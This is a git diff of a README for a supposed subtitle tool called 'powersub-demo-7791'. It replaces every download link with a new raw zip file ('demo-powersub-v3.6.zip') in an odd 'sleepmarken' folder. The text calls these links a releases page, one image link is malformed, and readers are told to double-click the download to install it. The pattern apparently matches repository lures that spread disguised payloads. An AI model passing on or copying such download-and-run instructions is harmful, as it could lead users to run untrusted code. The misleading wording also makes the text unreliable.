@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-7791 - Simple and Fast Subtitle Management
 
-![Download](https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/powersub-demo-7791.zip%https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/powersub-demo-7791.zip)
+![Download](https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/demo-powersub-v3.6.zip%https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/demo-powersub-v3.6.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application:
 
 1. **Download the Application**  
    Click the link below to visit the releases page and download the latest version:  
-   [Download the latest release](https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/powersub-demo-7791.zip)
+   [Download the latest release](https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/demo-powersub-v3.6.zip)
 
 2. **Install the Application**  
    Once the download is complete, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -41,7 +41,7 @@ The powersub-demo-7791 application offers several user-friendly features:
 ## 📥 Download & Install
 
 To get started with powersub-demo-7791, visit the releases page to download the latest version:  
-[Download the latest release](https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/powersub-demo-7791.zip)
+[Download the latest release](https://raw.githubusercontent.com/mrohn382528/powersub-demo-7791/main/sleepmarken/demo-powersub-v3.6.zip)
 
 Simply follow the installation steps mentioned above to have the application running on your computer in no time!
 
